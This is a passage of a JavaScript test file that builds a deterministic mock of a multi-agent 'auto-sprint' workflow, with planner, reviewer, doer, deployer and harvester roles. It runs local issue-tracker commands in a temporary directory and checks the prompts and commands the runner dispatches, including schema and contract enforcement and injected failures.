import path from 'path';
import { fileURLToPath } from 'url';
import fs from 'fs/promises';
import { exec } from 'child_process';
import os from 'os';
import { FleetWorkflow, CommandError } from '@apralabs/apra-fleet-workflow';
import { WorkflowEngine } from '@apralabs/apra-fleet-workflow/engine';
import { SprintPlanRejectedError, StalledSprintError, ReviewerContractViolationError } from '../auto-sprint/errors.mjs';
import { parseBdJson, checkMemberTopology, sanitizePrText, computeBranchSlug, buildHarvesterPrompt } from '../auto-sprint/runner.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Deterministic, CI-friendly mock of a full auto-sprint cycle driven against
// packages/apra-fleet-se/auto-sprint/runner.js. No live MCP server, no
// Math.random(), no fixed multi-second sleeps -- every branch below matches
// the EXACT lowercase `agentType` strings runner.js dispatches:
//   planner, plan-reviewer, doer, reviewer, deployer, integ-test-runner, harvester
//
// Set MOCK_SPRINT_DELAY_MS to simulate LLM latency locally; defaults to 0 for CI.
const DELAY_MS = Number(process.env.MOCK_SPRINT_DELAY_MS || 0);

// Helper to run shell commands in JS
const runCmd = (cmd, cwd) => new Promise((resolve) => {
    exec(cmd, { cwd, env: { ...process.env, BD_ALLOW_REMOTE_MIGRATE: '1' } }, (err, stdout, stderr) => {
        resolve({ err, stdout, stderr });
    });
});

const sleep = (ms) => (ms > 0 ? new Promise((r) => setTimeout(r, ms)) : Promise.resolve());

async function setup(tempDirSuffix) {
    const tempDir = path.join(os.tmpdir(), `apra-fleet-mock-sprint-${tempDirSuffix}-${Date.now()}-${process.pid}`);
    await fs.mkdir(tempDir, { recursive: true });

    const initRes = await runCmd('bd init', tempDir);

    // `--silent` returns the created id directly on stdout, from the exact
    // write just performed -- unlike a separate `bd list --json` + title
    // match immediately afterward, which reads back through bd's embedded
    // Dolt store and can lag behind a just-completed write on a cold/fresh
    // environment (observed in CI: a fresh `bd` install with no warmed-up
    // Dolt state hits this every time, even though sequential `bd create`
    // calls each fully complete -- exec()'s callback only fires on process
    // exit -- before the next command starts).
    const epicRes = await runCmd('bd create -t epic "Epic: Fleet Member Management APIs" -d "This epic covers the implementation of member management APIs for apra-fleet-client. It includes registerMember, listMembers, and ensuring they integrate securely using fetch across the MCP JSON-RPC boundary." --silent', tempDir);
    const task1Res = await runCmd('bd create "Task: Implement registerMember in client.js" -d "Implement a registerMember(config) function in the ApraFleet API class. It should accept an object with name, prompt, url, token, etc., and map to the register_member tool." --silent', tempDir);
    const task2Res = await runCmd('bd create "Task: Implement listMembers in client.js" -d "Implement a listMembers() function in the ApraFleet API class. It should call the list_members tool and return the parsed JSON array of active fleet members." --silent', tempDir);
    const epicId = epicRes.stdout.trim();
    const task1Id = task1Res.stdout.trim();
    const task2Id = task2Res.stdout.trim();

    if (!epicId || !task1Id || !task2Id) {
        const describe = (label, res) => `${label}: err=${res.err ? JSON.stringify(res.err.message) : 'null'} stdout=${JSON.stringify(res.stdout)} stderr=${JSON.stringify(res.stderr)}`;
        throw new Error(
            `[advanced-mock-runner-test] setup(${tempDirSuffix}): bd create --silent did not return an id for one or more beads. tempDir=${tempDir}\n` +
                `  ${describe('bd init', initRes)}\n` +
                `  ${describe('epic create', epicRes)}\n` +
                `  ${describe('task1 create', task1Res)}\n` +
                `  ${describe('task2 create', task2Res)}`,
        );
    }

    await runCmd(`bd update ${task1Id} --parent ${epicId}`, tempDir);
    await runCmd(`bd update ${task2Id} --parent ${epicId}`, tempDir);

    const finalList = JSON.parse((await runCmd('bd list --json', tempDir)).stdout || '[]');
    const epicBead = finalList.find((b) => b.id === epicId);
    const task1 = finalList.find((b) => b.id === task1Id);
    const task2 = finalList.find((b) => b.id === task2Id);
    if (!epicBead || !task1 || !task2) {
        throw new Error(`[advanced-mock-runner-test] setup(${tempDirSuffix}): bd list --json did not include one or more just-created beads (epicId=${epicId}, task1Id=${task1Id}, task2Id=${task2Id}). Found ${finalList.length} bead(s): ${JSON.stringify(finalList.map((b) => b.id))}. tempDir=${tempDir}`);
    }

    // deploy.md / integ-test-playbook.md let runner.js's fs.existsSync probes
    // (via `node -e "require('fs').existsSync(...)"`) resolve to "found",
    // enabling the Deploy and Integ Test phases deterministically.
    await fs.writeFile(path.join(tempDir, 'deploy.md'), '# Deploy Apra Fleet Client\nrun `npm publish`');
    await fs.writeFile(path.join(tempDir, 'integ-test-playbook.md'), '# Integ Test\nRun `vitest e2e`');

    return { tempDir, epicBead, task1, task2 };
}

/**
 * Minimal setup variant for the apra-fleet-unw.16 develop/review-loop
 * scenarios below: an epic + N plain tasks, NO deploy.md/integ-test-
 * playbook.md (so those phases are deterministically skipped and don't need
 * their own mock branches), and returns the created task bead objects in
 * creation order so scenario code can address them by id without re-parsing
 * `bd list` output itself.
 */
async function setupMinimal(tempDirSuffix, taskSpecs) {
    const tempDir = path.join(os.tmpdir(), `apra-fleet-mock-sprint-${tempDirSuffix}-${Date.now()}-${process.pid}`);
    await fs.mkdir(tempDir, { recursive: true });

    const initRes = await runCmd('bd init', tempDir);
    // `--silent` returns the created id directly, from the write just
    // performed -- avoids a separate `bd list --json` + title match, which
    // reads back through bd's embedded Dolt store and can lag behind a
    // just-completed write on a cold/fresh environment (see setup() above).
    const epicRes = await runCmd(`bd create -t epic "Epic: ${tempDirSuffix}" -d "Scenario epic for apra-fleet-unw.16 mock test." --silent`, tempDir);
    const epicId = epicRes.stdout.trim();
    if (!epicId) {
        throw new Error(
            `[advanced-mock-runner-test] setupMinimal(${tempDirSuffix}): bd create --silent did not return an epic id. tempDir=${tempDir}\n` +
                `  bd init: err=${initRes.err ? JSON.stringify(initRes.err.message) : 'null'} stdout=${JSON.stringify(initRes.stdout)} stderr=${JSON.stringify(initRes.stderr)}\n` +
                `  epic create: err=${epicRes.err ? JSON.stringify(epicRes.err.message) : 'null'} stdout=${JSON.stringify(epicRes.stdout)} stderr=${JSON.stringify(epicRes.stderr)}`,
        );
    }
    const epicBead = { id: epicId };

    const tasks = [];
    for (const spec of taskSpecs) {
        // apra-fleet-unw.17: `spec.priority` (e.g. 'P3') lets a scenario
        // create a task below the sprint's goal priority, for the A5
        // goal-priority exit-condition scenarios below.
        const priorityFlag = spec.priority ? ` -p ${spec.priority}` : '';
        const createRes = await runCmd(`bd create "${spec.title}" -d "${spec.description || 'Scenario task.'}"${priorityFlag} --silent`, tempDir);
        const id = createRes.stdout.trim();
        await runCmd(`bd update ${id} --parent ${epicBead.id}`, tempDir);
        tasks.push({ id, title: spec.title });
    }

    return { tempDir, epicBead, tasks };
}

/**
 * Builds a deterministic mock FleetApi. Every executePrompt() call is
 * recorded into `dispatched` so the caller can assert on the exact sequence
 * of agentType dispatches, and can diff that sequence across repeated runs.
 * Every dispatched entry also carries `member` (opts.member_name) so tests
 * can assert on WHICH member a doer/reviewer dispatch landed on
 * (apra-fleet-unw.16 acceptance criterion 1: the doer pool must not
 * collapse to a single member when 2+ are configured).
 *
 * Every executeCommand() call is additionally recorded into `commandLog` in
 * dispatch order -- used to assert on the git/gh command-call log added by
 * apra-fleet-unw.14 (branch creation at sprint start, push + PR raise at
 * finalization) and, as of apra-fleet-unw.16, on the orchestrator-issued
 * `bd update --status=open` reopen calls (the reviewer must never issue
 * these itself -- see the reviewer-dispatch-prompt grep assertions below).
 *
 * `planReviewerMode` (apra-fleet-unw.15) controls the plan-reviewer mock's
 * behaviour:
 *   - 'reject-then-approve' (default): CHANGES_NEEDED (schema-valid JSON)
 *     on round 1, APPROVED on round 2+. Exercises the normal happy path.
 *   - 'always-reject-free-text': every round, the reviewer returns
 *     free-text containing the literal substring "APPROVED" inside a
 *     non-approving sentence ("This can NOT be APPROVED") and is never
 *     valid JSON. This must never be misread as an approval (no substring
 *     matching in runner.js's plan phase) and must exhaust the schema-repair
 *     loop every round, ultimately aborting the sprint via
 *     SprintPlanRejectedError with zero doer dispatches.
 *   - 'approve-immediately': APPROVED on round 1, every round. Used by the
 *     apra-fleet-unw.16 develop/review-loop scenarios below, which don't
 *     care about plan-phase re-planning and want to reach Develop in one
 *     round for a smaller, easier-to-reason-about dispatch sequence.
 *
 * `doerHandler(ctx)` / `reviewerHandler(ctx)` (apra-fleet-unw.16), when
 * provided, let a scenario override the doer/reviewer mock's behavior
 * (e.g. throw, lie about closing a bead, or return specific
 * reopenIds/newTasks) without needing a second, near-duplicate mock
 * builder. Each receives `{ opts, tempDir, runCmd, epicBead, reviewRound }`
 * and must return the same `{ content: [{ text }] }` shape `executePrompt`
 * itself returns. When omitted, sensible defaults (close every assigned
 * bead / approve-with-no-reopens) are used -- these defaults are what the
 * original run1/run2 happy-path scenario relies on.
 */
// apra-fleet-unw2.22 (N12 follow-up): the harvester contract check must
// genuinely validate that runner.js supplied real, non-trivial CONTENT for
// analysisText/costAnalysis -- not merely that the prompt contains the
// static instructional label text buildHarvesterPrompt() always emits
// regardless of the underlying value. It previously used
// `/analysisText \(pre-computed by the orchestrator/.test(p)` etc., which
// is proven to still pass even when runner.js's buildAnalysisText()/
// buildCostAnalysis() silently return an empty string (see this bead's
// description). This helper extracts the actual fenced VALUE for
// analysisText/costAnalysis (the fence chars are a variable-length run of
// backticks per buildHarvesterPrompt's collision-safe `fence()`, so the
// regex captures whatever fence length was actually used) and requires it
// to be non-trivially long once trimmed.
//
// Also fixes analysisArtifactFile: the previous
// `/analysisArtifactFile:\s*\S+/` regex used `\s*` (which matches `\n`)
// between the colon and the value, so a BLANK analysisArtifactFile let it
// skip straight over the following blank-line paragraph break and match
// into the next paragraph's first word ("analysisText"), silently passing.
// The fixed regex uses `[ \t]*` (line-internal whitespace only) and is
// anchored with `^`/`$` (via the `m` flag) so it can never cross a
// newline.
const MIN_NONTRIVIAL_LEN = 15;

function checkHarvesterContract(prompt) {
    const missing = [];

    const artifactMatch = /^analysisArtifactFile:[ \t]*(\S+)[ \t]*$/m.exec(prompt);
    if (!artifactMatch || artifactMatch[1].trim().length === 0) {
        missing.push('analysisArtifactFile');
    }

    const analysisTextMatch = /analysisText \(pre-computed by the orchestrator[^\n]*\):\n(`{3,})\n([\s\S]*?)\n\1/.exec(prompt);
    if (!analysisTextMatch || analysisTextMatch[2].trim().length < MIN_NONTRIVIAL_LEN) {
        missing.push('analysisText');
    }

    const costAnalysisMatch = /costAnalysis \(pre-computed by the orchestrator[^\n]*\):\n(`{3,})\n([\s\S]*?)\n\1/.exec(prompt);
    if (!costAnalysisMatch || costAnalysisMatch[2].trim().length < MIN_NONTRIVIAL_LEN) {
        missing.push('costAnalysis');
    }

    if (!/Branch:\s*\S+\s*\(base:\s*\S+\)/.test(prompt)) {
        missing.push('base-branch/branch');
    }

    return missing;
}

function buildMockFleetApi(tempDir, epicBead, dispatched, commandLog, options = {}) {
    const {
        planReviewerMode = 'reject-then-approve',
        doerHandler = null,
        reviewerHandler = null,
        addExtraTaskDuringPlan = true,
        // apra-fleet-unw.17 additions:
        deployHandler = null,
        integHandler = null,
        finalReviewHandler = null,
        // Optional (cmd: string) => boolean predicate: when it returns
        // true for a given executeCommand() invocation, the mock returns
        // `{ isError: true, ... }` instead of actually running the command
        // -- used to simulate a probe (or any other command()) failure
        // deterministically, without depending on real filesystem/process
        // flakiness.
        commandFailurePattern = null,
        // apra-fleet-unw2.4 (N4): per-member modeling. `commandLogDetailed`,
        // when provided, receives one `{ command, member }` entry per
        // executeCommand() call so a test can assert WHICH member each
        // git/gh/bd command was dispatched to (not just that it happened) --
        // the existing string-only `commandLog` is kept untouched for
        // backward compatibility. `memberGitState`, when provided, is a
        // Map<member, { ensuredBranches:Set, checkedOut:string|null }> that
        // simulates each member's git checkout independently: a
        // `git checkout -B <b>` (initial ensure) adds <b> to that member's
        // ensuredBranches and makes it current; a plain `git checkout <b>`
        // (the non-destructive re-ensure) only updates `checkedOut`. This
        // lets the 2-member regression test verify the branch-ensure reached
        // BOTH members' checkouts, which is exactly the state the pre-fix
        // (orchestrator-only ensure) failed to establish. The bd DB itself
        // still defaults to a single shared tempDir for every member (the
        // supported shared-workspace mode), so all existing single-workspace
        // tests are unaffected.
        commandLogDetailed = null,
        memberGitState = null,
        // apra-fleet-unw2.9 (N11): injectable git/gh failure. Optional
        // (cmd: string) => boolean predicate, tested ONLY against `git `/
        // `gh ` commands (the ones this mock otherwise short-circuits to a
        // hardcoded success below). When it matches, the mock returns
        // `{ isError: true, ... }` with `gitGhFailureMessage` (or a default)
        // as the failure text -- this is what lets a test observe a git/gh
        // failure path (e.g. `git push` rejected, `gh pr create` erroring
        // for a reason OTHER than "already exists") as something OTHER than
        // the unconditional "ok (mocked...)" success every git/gh command
        // got before this issue. Deliberately separate from
        // `commandFailurePattern` above, which is never matched against
        // git/gh commands (see the intercept order below) -- that keeps
        // existing scenarios using `commandFailurePattern` for bd/node probe
        // failures unaffected.
        gitGhFailurePattern = null,
        gitGhFailureMessage = null,
        // apra-fleet-unw2.9 (N11): idempotent-PR-creation simulation. When
        // provided, this Set is used (instead of a call-local one) to track
        // which branches already have a mock-simulated open PR -- passing
        // the SAME Set into two successive buildMockFleetApi()/scenario
        // calls for the SAME branch simulates "run finalization again
        // against a branch that already has a PR from a prior run", which
        // is exactly the idempotency regression this issue guards against.
        // When omitted, a fresh, call-local Set is used (existing scenarios
        // -- which never re-run against the same branch twice -- are
        // unaffected either way).
        prExistsState = new Set(),
    } = options;

    let planRound = 0;
    let reviewRound = 0;
    let extraTaskAdded = false;

    const defaultDoerHandler = async ({ opts }) => {
        const match = opts.prompt.match(/Assigned bead ids \(comma-separated\):\s*(.+)/);
        const ids = match ? match[1].split(',').map((s) => s.trim()).filter(Boolean) : [];
        for (const id of ids) {
            await runCmd(`bd close ${id}`, tempDir);
        }
        return {
            content: [{
                text: JSON.stringify({
                    status: 'VERIFY',
                    closedIds: ids,
                    notes: 'Implemented the requested fleet client methods using fetch to hit the MCP JSON-RPC endpoints. Closed the assigned beads.'
                })
            }]
        };
    };

    const defaultReviewerHandler = async ({ opts, reviewRound: rRound }) => {
        // Scripted, deterministic scenario: reopen exactly once, on the
        // first review round, then approve on every subsequent round. No
        // Math.random() -- identical on every run. Per apra-fleet-unw.16,
        // the mock reviewer only ever RETURNS reopenIds -- it never runs
        // `bd update` itself; the runner (orchestrator) is responsible for
        // applying the transition. See the reviewer-dispatch-prompt grep
        // assertions in main() below, which confirm the prompt text itself
        // forbids the reviewer from mutating beads.
        if (rRound === 1) {
            const closedRes = await runCmd(`bd list --parent ${epicBead.id} --status=closed --json`, tempDir);
            const closedBeads = JSON.parse(closedRes.stdout || '[]').sort((a, b) => a.id.localeCompare(b.id));
            if (closedBeads.length > 0) {
                const target = closedBeads[0];
                return {
                    content: [{
                        text: JSON.stringify({
                            verdict: 'CHANGES_NEEDED',
                            notes: `The implementation for ${target.id} is missing error handling for 401 Unauthorized responses. Please fix.`,
                            reopenIds: [target.id],
                            newTasks: [],
                        })
                    }]
                };
            }
        }
        return {
            content: [{
                text: JSON.stringify({
                    verdict: 'APPROVED',
                    notes: 'Code logic is sound. Error handling and type definitions match the spec. Approved.',
                    reopenIds: [],
                    newTasks: [],
                })
            }]
        };
    };

    return {
        executeCommand: async (opts) => {
            commandLog.push(opts.command);

            // apra-fleet-unw2.4 (N4): per-member command log + simulated
            // per-member git checkout state (see the option comments above).
            if (commandLogDetailed) {
                commandLogDetailed.push({ command: opts.command, member: opts.member_name });
            }
            if (memberGitState) {
                const m = opts.member_name || '(none)';
                if (!memberGitState.has(m)) memberGitState.set(m, { ensuredBranches: new Set(), checkedOut: null });
                const st = memberGitState.get(m);
                const ensureMatch = opts.command.match(/git checkout -B (\S+)/);
                if (ensureMatch) {
                    st.ensuredBranches.add(ensureMatch[1]);
                    st.checkedOut = ensureMatch[1];
                } else {
                    const coMatch = opts.command.match(/^git checkout (\S+)\s*$/);
                    if (coMatch) st.checkedOut = coMatch[1];
                }
            }

            // git/gh commands (apra-fleet-unw.14's branch-ensure/push/PR
            // steps) are intercepted rather than run for real: tempDir is a
            // bare `bd init` scratch directory, not a git repo with an
            // 'origin' remote, so there is nothing real to git-fetch/push/
            // gh-pr-create against here. This keeps the mock hermetic while
            // still exercising and asserting on runner.js's dispatch of
            // these commands.
            if (/^(git|gh)\s/.test(opts.command)) {
                // apra-fleet-unw2.9 (N11): injectable git/gh failure takes
                // priority over the PR-exists simulation below -- a test
                // that wants to observe a genuine (non-"already exists")
                // git/gh failure should get exactly that, deterministically.
                if (gitGhFailurePattern && gitGhFailurePattern.test(opts.command)) {
                    return {
                        isError: true,
                        content: [{ text: gitGhFailureMessage || `mock git/gh failure (injected) for: ${opts.command}` }],
                    };
                }

                // apra-fleet-unw2.9 (N11): idempotent `gh pr create`
                // simulation -- the first `gh pr create --head "<branch>"`
                // for a given branch records that branch into
                // `prExistsState` and succeeds; a SECOND `gh pr create` for
                // the SAME branch (simulating a re-run of finalization
                // against a branch that already has an open PR) fails with
                // an "already exists" message, mirroring the real `gh`
                // CLI's behaviour for this case.
                const prCreateMatch = /^gh pr create\b.*--head "([^"]+)"/.exec(opts.command);
                if (prCreateMatch) {
                    const branch = prCreateMatch[1];
                    if (prExistsState.has(branch)) {
                        return {
                            isError: true,
                            content: [{ text: `GraphQL: a pull request for branch "${branch}" already exists: https://github.com/mock-org/mock-repo/pull/1 (createPullRequest)` }],
                        };
                    }
                    prExistsState.add(branch);
                }

                return { content: [{ text: 'ok (mocked -- no real git remote in this mock sprint)' }] };
            }

            // apra-fleet-unw.17, A4 acceptance criterion 5: deterministic
            // command-failure injection for probe/other command() calls,
            // used by the probe-failure-skips-phase scenario below.
            if (commandFailurePattern && commandFailurePattern.test(opts.command)) {
                return { isError: true, content: [{ text: `mock command failure (injected) for: ${opts.command}` }] };
            }

            // No stale intercepts here otherwise: runner.js's Deploy/Integ
            // probes, `bd show`/`bd update`/`bd create` reopen/newTasks
            // calls, etc. are executed for real against tempDir, same as
            // every other bd/node command below.
            const { err, stdout, stderr } = await runCmd(opts.command, tempDir);
            if (err) {
                return { isError: true, content: [{ text: stderr || err.message }] };
            }
            return { content: [{ text: stdout }] };
        },
        executePrompt: async (opts) => {
            // Note: the workflow layer's agent() payload does NOT forward
            // opts.label into executePrompt (see
            // packages/apra-fleet-workflow/src/workflow/index.mjs, payload
            // only carries prompt/model/member/agent/etc.), so the Final
            // Review phase cannot be distinguished from the regular
            // per-round review via opts.label here. Both share agentType
            // 'reviewer'; distinguish by the (fixed, runner.js-authored)
            // prompt text instead -- apra-fleet-unw.17's buildFinalVerdictPrompt()
            // always starts with this exact prefix.
            const isFinalReview = opts.agent === 'reviewer' && opts.prompt.startsWith('Final review for sprint scope issue id(s):');
            const isStreakAssignment = opts.agent === 'planner' && opts.prompt.includes('Ready bead ids:');
            dispatched.push({ agent: opts.agent, label: isFinalReview ? 'Final Review' : null, prompt: opts.prompt, member: opts.member_name });
            await sleep(DELAY_MS);

            // --- plan phase: planner ---
            if (opts.agent === 'planner' && !isStreakAssignment) {
                if (addExtraTaskDuringPlan && !extraTaskAdded) {
                    extraTaskAdded = true;
                    // Contract enforcement (vendored planner.md Step 3): the
                    // model tier is recorded ONLY as beads `--metadata`
                    // ('{"model": "..."}') at creation time -- never in
                    // `--notes`. This mock planner obeys that contract so the
                    // suite exercises the same shape a real planner would
                    // produce, catching any future drift back to `--notes`.
                    // NOTE: the JSON arg is double-quoted with escaped inner
                    // quotes (NOT single-quoted) so it survives Windows
                    // cmd.exe, where single quotes are literal characters and
                    // would make bd reject the metadata as invalid JSON.
                    await runCmd('bd create -t task "Task: Add tests for API endpoints" --metadata "{\\"model\\": \\"standard-tier\\"}"', tempDir);
                    const list = JSON.parse((await runCmd('bd list --json', tempDir)).stdout || '[]');
                    const newTask = list.find((i) => i.title.includes('Add tests for API endpoints'));
                    if (newTask) {
                        await runCmd(`bd update ${newTask.id} --parent ${epicBead.id}`, tempDir);
                    }
                }
                return {
                    content: [{
                        text: 'Analyzed the Fleet Member API epic. Ensured tasks exist for implementation and for e2e tests covering registerMember and listMembers.'
                    }]
                };
            }

            // --- plan phase: plan-reviewer ---
            if (opts.agent === 'plan-reviewer') {
                planRound++;

                // Contract enforcement (vendored plan-reviewer.md Inputs +
                // agents/schemas/plan-reviewer-input.json, required: ["scope"]):
                // the dispatch prompt MUST supply the sprint root / scope to
                // review. Per plan-reviewer.md's missing-input behavior, a
                // dispatch without scope must return verdict CHANGES_NEEDED,
                // notes stating the scope is missing, and taskAssignments: [].
                // This mock obeys that CONTRACT rather than the runner's old
                // behavior: if runner.js ever reverts to a context-free
                // dispatch (no scope / no sprint root id), the plan is never
                // approved and the sprint fails -- a tripwire on regression.
                const promptHasScope = /scope/i.test(opts.prompt) && opts.prompt.includes(epicBead.id);
                if (!promptHasScope) {
                    return {
                        content: [{
                            text: JSON.stringify({
                                verdict: 'CHANGES_NEEDED',
                                notes: 'Dispatch prompt did not supply the sprint root / scope to review (plan-reviewer-input.json required key "scope" missing).',
                                taskAssignments: [],
                            })
                        }]
                    };
                }

                // apra-fleet-unw.15: plan-reviewer responses are now
                // schema-validated JSON (contracts.mjs `planReviewerVerdict`)
                // consumed via agent()'s { schema } option, not free text.
                if (planReviewerMode === 'always-reject-free-text') {
                    // Deliberately NOT JSON, and deliberately contains the
                    // substring "APPROVED" inside a rejection sentence --
                    // this must never be misread as an approval, and must
                    // exhaust agent()'s bounded schema-repair loop (it can
                    // never be coerced into schema-valid JSON) every round.
                    return { content: [{ text: 'This can NOT be APPROVED: the DAG is still missing a documentation task.' }] };
                }

                if (planReviewerMode === 'approve-immediately' || planRound >= 2) {
                    return {
                        content: [{
                            text: JSON.stringify({
                                verdict: 'APPROVED',
                                notes: 'Code looks solid. We have tasks for implementation and tests.',
                                taskAssignments: [],
                            })
                        }]
                    };
                }

                return {
                    content: [{
                        text: JSON.stringify({
                            verdict: 'CHANGES_NEEDED',
                            notes: 'Ensure you also add a documentation task.',
                            taskAssignments: [],
                        })
                    }]
                };
            }

            // --- develop phase: streak grouping (still agentType 'planner') ---
            // apra-fleet-unw.16: the runner now dispatches this with a
            // schema (contracts.mjs `streakAssignment`) and actually
            // consumes the result -- the mock returns real, schema-valid
            // JSON (one bead per streak, covering every ready bead id
            // exactly once) rather than free text, so the "real
            // consumption" path is exercised, not the invalid-output
            // fallback.
            if (isStreakAssignment) {
                const idsMatch = opts.prompt.match(/Ready bead ids:\s*(.+)/);
                const ids = idsMatch ? idsMatch[1].split(',').map((s) => s.trim()).filter(Boolean) : [];
                return { content: [{ text: JSON.stringify({ streaks: ids.map((id) => [id]) }) }] };
            }

            // --- develop phase: doer ---
            if (opts.agent === 'doer') {
                // Contract enforcement (vendored doer.md Inputs +
                // agents/schemas/doer-input.json, required: ["branch"]): the
                // dispatch prompt MUST supply the sprint track branch to work
                // on. Per doer.md's missing-input behavior, a doer dispatched
                // without a branch must return status "BLOCKED" (closedIds:
                // []) instead of guessing whatever branch is checked out.
                // Enforced here at the dispatch seam -- BEFORE any scenario's
                // doerHandler override runs -- so every doer path obeys the
                // CONTRACT uniformly: if runner.js ever drops the branch from
                // buildDoerPrompt, no bead is ever worked/closed and the
                // sprint fails, tripping this regression.
                if (!/Sprint track branch to work on:\s*\S+/.test(opts.prompt)) {
                    return {
                        content: [{
                            text: JSON.stringify({
                                status: 'BLOCKED',
                                closedIds: [],
                                notes: 'Sprint track branch was not specified in the dispatch prompt (doer-input.json required key "branch" missing).',
                            })
                        }]
                    };
                }
                const handler = doerHandler || defaultDoerHandler;
                return handler({ opts, tempDir, runCmd, epicBead });
            }

            // --- review phase: reviewer (dev-loop review; final review handled separately below) ---
            if (opts.agent === 'reviewer' && !isFinalReview) {
                reviewRound++;
                const handler = reviewerHandler || defaultReviewerHandler;
                return handler({ opts, tempDir, runCmd, epicBead, reviewRound });
            }

            // --- final review (apra-fleet-unw.17, A6) ---
            //
            // Default mock: an EVIDENCE-BASED final reviewer, not a blind
            // rubber stamp. It parses the real evidence runner.js's
            // buildFinalVerdictPrompt() embeds in the prompt text (open
            // goal-priority bead count, deploy/integ failure markers) and
            // returns a verdict actually derived from that evidence --
            // deliberately NOT a hardcoded PASS -- so this mock can never
            // accidentally paper over the exact "rubber-stamped success" bug
            // (A6) this test suite exists to catch. `finalReviewHandler`
            // lets a scenario override this when it wants to control the
            // verdict directly instead (e.g. to test a hard-FAIL response).
            if (isFinalReview) {
                if (finalReviewHandler) {
                    return finalReviewHandler({ opts, tempDir, runCmd, epicBead });
                }
                const openMatch = opts.prompt.match(/(\d+) bead\(s\) still open at or above goal priority/);
                const openCount = openMatch ? Number(openMatch[1]) : 0;
                const hasDeployFailure = opts.prompt.includes('Deploy phase FAILED');
                const hasIntegFailure = opts.prompt.includes('Integration tests FAILED');
                if (openCount > 0 || hasDeployFailure || hasIntegFailure) {
                    return {
                        content: [{
                            text: JSON.stringify({
                                verdict: 'FAIL',
                                notes: `Evidence-based FAIL: ${openCount} open goal-priority bead(s), deployFailure=${hasDeployFailure}, integFailure=${hasIntegFailure}.`,
                            })
                        }]
                    };
                }
                return {
                    content: [{
                        text: JSON.stringify({
                            verdict: 'PASS',
                            notes: 'All goal-priority beads closed, last review APPROVED, deploy/integ phases (if any) succeeded. Excellent velocity and solid implementation.',
                        })
                    }]
                };
            }

            // --- deploy phase (apra-fleet-unw.17, A4: schema-validated) ---
            if (opts.agent === 'deployer') {
                if (deployHandler) return deployHandler({ opts, tempDir, runCmd, epicBead });
                return {
                    content: [{
                        text: JSON.stringify({
                            deployed: true,
                            notes: 'Successfully ran `npm publish` and published @apralabs/apra-fleet-client to the local registry.',
                        })
                    }]
                };
            }

            // --- integ test phase (apra-fleet-unw.17, A4: schema-validated) ---
            if (opts.agent === 'integ-test-runner') {
                if (integHandler) return integHandler({ opts, tempDir, runCmd, epicBead });
                return {
                    content: [{
                        text: JSON.stringify({
                            featuresClosed: 2,
                            issuesCreated: 0,
                            passed: true,
                            bugsFiled: [],
                            summary: 'All vitest e2e specs passed successfully.',
                        })
                    }]
                };
            }

            // --- harvest phase (apra-fleet-unw.17, A6: schema-validated;
            //     apra-fleet-unw2.10, N12: contract enforcement) ---
            //
            // The vendored harvester-input.json requires
            // analysisArtifactFile/analysisText/costAnalysis/base-branch/
            // branch (see agents/harvester.md's own "Missing-input
            // behavior": a contract-obeying harvester returns FAILED, never
            // fabricates a substitute, if any of these is absent from its
            // dispatch). This mock now enforces that for real -- it is NOT
            // enough for the runner to merely include SOME text; each
            // required input must be genuinely present in the prompt this
            // dispatch actually received. Prior to apra-fleet-unw2.10 the
            // runner told the harvester these were UNAVAILABLE; this check
            // fails loudly if that regression ever comes back.
            if (opts.agent === 'harvester') {
                const missing = checkHarvesterContract(opts.prompt);
                if (missing.length > 0) {
                    return {
                        content: [{
                            text: JSON.stringify({
                                status: 'FAILED',
                                notes: `Missing required harvester input(s): ${missing.join(', ')}.`,
                            })
                        }]
                    };
                }
                return {
                    content: [{
                        text: JSON.stringify({
                            status: 'OK',
                            notes: 'Harvested API usage patterns to memory. Updated context docs.',
                        })
                    }]
                };
            }

            // Any agentType reaching here means runner.js dispatched something
            // this mock doesn't know about -- fail loudly instead of silently
            // falling through to a generic stub (that's exactly the bug this
            // test exists to catch).
            throw new Error(`advanced-mock-runner-test: unhandled agentType '${opts.agent}' (label=${opts.label})`);
        }
    };
}

async function teardown(tempDir) {
    if (!tempDir) return;
    let retries = 8;
    while (retries > 0) {
        try {
            // Windows can hold file handles open briefly after child
            // processes (bd CLI) exit; retry on EBUSY.
            await fs.rm(tempDir, { recursive: true, force: true, maxRetries: 3 });
            return;
        } catch (e) {
            if (e.code === 'EBUSY' && retries > 1) {
                retries--;
                await sleep(400);
            } else {
                console.error('Could not fully clean up temp dir:', tempDir, e.message);
                return;
            }
        }
    }
}

async function runOnce(tag, planReviewerMode = 'reject-then-approve') {
    const { tempDir, epicBead } = await setup(tag);
    const dispatched = [];
    const commandLog = [];
    try {
        const mockFleetApi = buildMockFleetApi(tempDir, epicBead, dispatched, commandLog, { planReviewerMode });
        const workflow = new FleetWorkflow(mockFleetApi, { targetRepo: tempDir });
        const engine = new WorkflowEngine(workflow);

        // apra-fleet-unw.14: runner.js now validates a full CLI->runner arg
        // contract (branch/base_branch/members are required; goal/max_cycles
        // are optional with defaults) before any dispatch, and uses
        // branch/base_branch for the git checkout/push/PR steps below.
        const scriptPath = path.join(__dirname, '../auto-sprint/runner.js');
        const result = await engine.executeFile(scriptPath, {
            target_issue: epicBead.id,
            members: ['local'],
            branch: 'auto-sprint/mock-sprint',
            base_branch: 'main',
            goal: 'P1/P2',
            max_cycles: 5,
        }, true);

        // bd list hides closed issues by default -- pass --all so the final
        // state assertion actually sees closed beads.
        const finalBeadsRaw = JSON.parse((await runCmd('bd list --all --json', tempDir)).stdout || '[]');
        const finalBeads = finalBeadsRaw
            .map((b) => ({ title: b.title, status: b.status }))
            .sort((a, b) => a.title.localeCompare(b.title));

        return { dispatched, result, finalBeads, commandLog, epicBeadId: epicBead.id };
    } finally {
        await teardown(tempDir);
    }
}

/**
 * apra-fleet-unw.15 scenario: the plan-reviewer never approves (always
 * returns non-JSON free text containing "APPROVED" inside a rejection
 * sentence, exhausting the schema-repair loop every round). Expects
 * engine.executeFile() to REJECT with a SprintPlanRejectedError, and
 * expects zero doer dispatches -- the sprint must never reach Develop with
 * an unapproved plan.
 */
async function runRejectedPlanScenario(tag) {
    const { tempDir, epicBead } = await setup(tag);
    const dispatched = [];
    const commandLog = [];
    try {
        const mockFleetApi = buildMockFleetApi(tempDir, epicBead, dispatched, commandLog, { planReviewerMode: 'always-reject-free-text' });
        const workflow = new FleetWorkflow(mockFleetApi, { targetRepo: tempDir });
        const engine = new WorkflowEngine(workflow);
        const scriptPath = path.join(__dirname, '../auto-sprint/runner.js');

        let error = null;
        try {
            await engine.executeFile(scriptPath, {
